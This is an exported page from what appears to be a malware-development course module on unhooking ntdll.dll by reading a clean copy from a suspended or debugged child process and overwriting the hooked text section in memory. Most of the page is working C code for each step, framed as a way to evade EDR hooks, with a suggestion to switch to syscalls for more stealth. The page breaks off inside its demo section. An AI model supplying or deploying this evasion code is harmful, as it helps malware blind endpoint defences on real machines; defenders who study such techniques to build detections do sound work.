<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>86. NTDLL Unhooking - From a Suspended Process</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="b586e5f7-6b06-4f63-a867-c116853ff11a" class="page sans"><header><h1 class="page-title"><a href="https://maldevacademy.com/modules/86"><strong>86. NTDLL Unhooking - From a Suspended Process</strong></a></h1></header><div class="page-body"><h2 id="2cb81c75-1d2e-4d0b-a07f-44c3e4578ae8" class=""><strong>NTDLL Unhooking - From a Suspended Process</strong></h2><h3 id="30def1e8-0ed7-4d87-8a76-527fb748dd7d" class=""><strong>Introduction</strong></h3><p id="cb363466-7569-43fb-bbc8-8ec55b6c5645" class="">An alternative method to unhook <code>ntdll.dll</code> involves reading it from a suspended process. This works because EDRs require a running process to install their hooks and therefore a process created in a suspended state, will contain a clean <code>ntdll.dll</code> image allowing for the text section of the current process to be substituted with that of the suspended one.</p><p id="d5d78c65-e888-4115-b95f-cfd06b44b159" class="">During a typical process startup, the Windows Loader will load the executable image (e.g. <code>notepad.exe</code>) before proceeding to map the <code>ntdll.dll</code> image, followed by all of the process&#x27;s DLL dependencies. However, creating a process in a suspended state results in only <code>ntdll.dll</code> being mapped. This works if the process is created as a debugged process as well which is shown in the image below via Process Hacker.</p><figure id="bae1f24f-84f9-46d4-aaf8-e87e45c6fd38" class="image"><a href="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-118639361-38c2053c-1ce0-4432-996e-539a04a34786.png"><img style="width:1026px" src="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-118639361-38c2053c-1ce0-4432-996e-539a04a34786.png"/></a></figure><h3 id="14188fc6-f9a1-400f-ae0e-4a5d7c0b7015" class=""><strong>Getting The Required Information</strong></h3><p id="2b467a21-ba95-4486-a65b-d58fe3e13b62" class="">To retrieve <code>ntdll.dll</code> from a remote process, it is necessary to determine the base address where NTDLL is mapped to. This process is simpler than it may initially appear and has already been carried out in the <em>Remote Function Stomping Injection</em> module. Since DLLs share the same base address, the local base address of <code>ntdll.dll</code> will be the same as the remote base address of it, this is shown in the following image by viewing NTDLL in 3 separate processes.</p><figure id="c635c466-9e09-4743-bf83-295d209e79e5" class="image"><a href="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-218648672-32764e8b-364c-43a0-8dd7-b3e94c7f2420.png"><img style="width:1920px" src="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-218648672-32764e8b-364c-43a0-8dd7-b3e94c7f2420.png"/></a></figure><p id="3eba42e6-6115-4caf-8738-f92042967e9a" class="">Therefore when any process is created, including child processes, in a suspended state, its <code>ntdll.dll</code> base address is known in advance. However, its size is not known and will need to be calculated by parsing the PE headers of the local <code>ntdll.dll</code> image and accessing its <code>OptionalHeader.SizeOfImage</code> element which contains the size of the image. For this reason, the following function <code>GetNtdllSizeFromBaseAddress</code> is created, which has one parameter, <code>pNtdllModule</code>, that will be the base address of an image (i.e. <code>ntdll.dll</code>) to fetch its size.</p><p id="05d6971b-5e87-4b39-aec4-e9bbff8c4b8b" class="">The <code>pNtdllModule</code> parameter can be supplied using the <code>FetchLocalNtdllBaseAddress</code> function which was used in previous NTDLL unhooking modules to retrieve the base address of the <code>ntdll.dll</code> image.</p><pre id="d507f7aa-ab8b-4095-b748-720cbbdfad6f" class="code code-wrap"><code>SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return pImgNtHdrs-&gt;OptionalHeader.SizeOfImage;
}
</code></pre><pre id="7f9dcf90-dd3b-44cf-846d-046164cb4a97" class="code code-wrap"><code>PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64// Reaching to the &#x27;ntdll.dll&#x27; module directly (we know its the 2nd image after &#x27;SuspendedProcessUnhooking.exe&#x27;)
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	return pLdr-&gt;DllBase;
}
</code></pre><h3 id="269ab150-c088-4a74-9ed8-6a23123015d8" class=""><strong>Creating A Suspended Process</strong></h3><p id="7fc99bb9-281b-434e-9669-3ac91c0508cb" class="">This has been performed several times throughout the course by using <code>CreateProcessA</code> with the <code>CREATE_SUSPENDED</code> or <code>DEBUG_PROCESS</code> flags. In the code below, the <code>DEBUG_PROCESS</code> flag will be used.</p><p id="5fa19b3b-48f8-4189-94ba-450a9681309a" class="">After the process is created, <code>ReadProcessMemory</code> is used to read the <code>ntdll.dll</code> image. The process is then detached using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocessstop">DebugActiveProcessStop</a> WinAPI and then terminated with the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess">TerminateProcess</a> WinAPI. Note that the process won&#x27;t be terminated if it&#x27;s not detached first.</p><p id="22bebdf6-b3e2-422d-8b0e-daabb55542e5" class="">If the <code>CREATE_SUSPENDED</code> flag was used then replace the <code>DebugActiveProcessStop</code> WinAPI with <code>ResumeThread</code>.</p><p id="3289c9a9-9b7f-4bde-aa6b-8e5a63272aa0" class="">The above logic is illustrated programmatically in the following <code>ReadNtdllFromASuspendedProcess</code> function.</p><pre id="365e047c-5d79-462a-983d-71eee90ee3ea" class="code code-wrap"><code>BOOL ReadNtdllFromASuspendedProcess(IN LPCSTR lpProcessName, OUT PVOID* ppNtdllBuf) {

	CHAR	cWinPath[MAX_PATH / 2]	= { 0 };
	CHAR	cProcessPath[MAX_PATH]	= { 0 };

	PVOID	pNtdllModule		= FetchLocalNtdllBaseAddress();
	PBYTE	pNtdllBuffer		= NULL;
	SIZE_T	sNtdllSize		    = NULL,
		    sNumberOfBytesRead	= NULL;

	STARTUPINFO                    Si     = { 0 };
	PROCESS_INFORMATION            Pi     = { 0 };

	// cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf(&quot;[!] GetWindowsDirectoryA Failed With Error : %d \n&quot;, GetLastError());
		goto _EndOfFunc;
	}

	// &#x27;sprintf_s&#x27; is a more secure version than &#x27;sprintf&#x27;
	sprintf_s(cProcessPath, sizeof(cProcessPath), &quot;%s\\System32\\%s&quot;, cWinPath, lpProcessName);

	if (!CreateProcessA(
		NULL,
		cProcessPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Substitute of CREATE_SUSPENDED
		NULL,
		NULL,
		&amp;Si,
		&amp;Pi)) {
		printf(&quot;[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
		goto _EndOfFunc;
	}

	// allocating enough memory to read ntdll from the remote process
	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
	if (!sNtdllSize)
		goto _EndOfFunc;
	pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
	if (!pNtdllBuffer)
		goto _EndOfFunc;

	// reading ntdll.dll
	if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &amp;sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
		printf(&quot;[!] ReadProcessMemory Failed with Error : %d \n&quot;, GetLastError());
		printf(&quot;[i] Read %d of %d Bytes \n&quot;, sNumberOfBytesRead, sNtdllSize);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

	// terminating the process
	if (DebugActiveProcessStop(Pi.dwProcessId) &amp;&amp; TerminateProcess(Pi.hProcess, 0)) {
                // process terminated successfully
	}


_EndOfFunc:
	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);
	if (Pi.hThread)
		CloseHandle(Pi.hThread);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;

}
</code></pre><h3 id="9746ddce-a493-434a-afca-ccdfd706f64e" class=""><strong>Putting It All Together</strong></h3><p id="c2bec9c9-1101-4b2f-92c6-fb8f44d64a0c" class="">Once a fresh copy of <code>ntdll.dll</code> has been successfully retrieved, the next step is to overwrite the hooked text section with the clean one. This is achieved using the <code>ReplaceNtdllTxtSection</code> function, as demonstrated in previous modules.</p><p id="0b613eed-ba62-44c8-8078-ea49e2d7714c" class="">Note that the unhooked copy of <code>ntdll.dll</code> was read from a memory region where it was mapped, being the suspended process&#x27;s address space. This means that the offset to the text section of the clean NTDLL file is <code>IMAGE_SECTION_HEADER.VirtualAddress</code> (4096).</p><pre id="c867b627-ac16-4c7b-8f57-e66b7b4c84e0" class="code code-wrap"><code>BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID               pLocalNtdll      = (PVOID)FetchLocalNtdllBaseAddress();

	// getting the dos header
	PIMAGE_DOS_HEADER   pLocalDosHdr      = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS   pLocalNtHdrs      = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
			    pRemoteNtdllTxt  = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL;	// the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, &quot;.text&quot;) == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == &#x27;xet.&#x27;) {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt	= (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

//---------------------------------------------------------------------------------------------------------------------------

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that &#x27;pRemoteNtdllTxt&#x27; is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;

//---------------------------------------------------------------------------------------------------------------------------

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [1] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	// copying the new text section
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
		printf(&quot;[!] VirtualProtect [2] Failed With Error : %d \n&quot;, GetLastError());
		return FALSE;
	}

	return TRUE;
}
</code></pre><h3 id="55321756-56a4-43eb-9302-c0775991854e" class=""><strong>Improving The Implementation</strong></h3><p id="62a7a9b5-6bb1-47f8-9626-30579b482367" class="">The current implementation unhooks <code>ntdll.dll</code> using WinAPIs. For a stealthier implementation, direct or indirect syscalls should be used to perform unhooking. This will be left as an objective for the reader.</p><h3 id="c79ab831-f7c8-4aa5-8bb0-693bada88827" class=""><strong>Demo</strong></h3><p id="e09eaa72-afe2-43c4-8014-7f592ee5fce1" class="">A suspended child process with PID <code>6412</code>.</p><figure id="6d161965-8f23-47f3-ac82-6795fe557720" class="image"><a href="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-318679682-0ba9b734-e1e7-4896-90d6-d05ada1ee9f7.png"><img style="width:1636px" src="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-318679682-0ba9b734-e1e7-4896-90d6-d05ada1ee9f7.png"/></a></figure><p id="428929b8-f12a-4a7b-9f7a-7c03ad9a9b57" class="">The hooked <code>ntdll.dll</code> text section to be replaced.</p><figure id="78a82f0c-0400-42b1-a7e6-ce7110e1e87e" class="image"><a href="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-418679690-a8faac4b-bb48-4d37-939d-70ca1a9711a2.png"><img style="width:1457px" src="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-418679690-a8faac4b-bb48-4d37-939d-70ca1a9711a2.png"/></a></figure><p id="674ef8c2-7549-43ab-ae4d-3eef87b84154" class="">The text section base address of the unhooked <code>ntdll.dll</code>.</p><figure id="6d02972f-0633-4b46-bfa2-f487b6f4a92e" class="image"><a 